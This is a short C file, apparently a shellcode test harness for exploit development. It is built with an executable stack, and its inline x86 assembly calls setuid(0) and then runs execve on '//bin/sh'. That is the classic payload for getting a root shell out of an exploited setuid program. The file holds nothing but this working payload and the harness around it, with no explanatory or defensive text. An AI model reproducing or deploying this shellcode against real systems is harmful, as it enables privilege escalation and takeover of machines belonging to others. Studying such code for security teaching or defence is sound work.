// gcc -o fix -z execstack ../src/shell_asm_fix.c
void foo()
{
    __asm__(
        "push   %ebp ;"
        "mov    %esp,%ebp ;"
        "sub    $0x8,%esp ;"
        "sub    $0xc,%esp ;"
        "push   $0x0 ;"
        "call   setuid ;"
        "add    $0x10,%esp ;"
        "nop ;"
        "xor    %edx,%edx ;"
        "push   %edx ;"
        "push   $0x68732f6e ;"
        "push   $0x69622f2f ;"
        "mov    %esp,%ebx ;"
        "push   %edx ;"
        "push   %ebx ;"
        "mov    %esp,%ecx ;"
        "lea    0xb(%edx),%eax ;"
        "int    $0x80;" //"sysenter ;"
    );
}

int main(int argc, char *argv[])
{
    foo();
    return 0;
}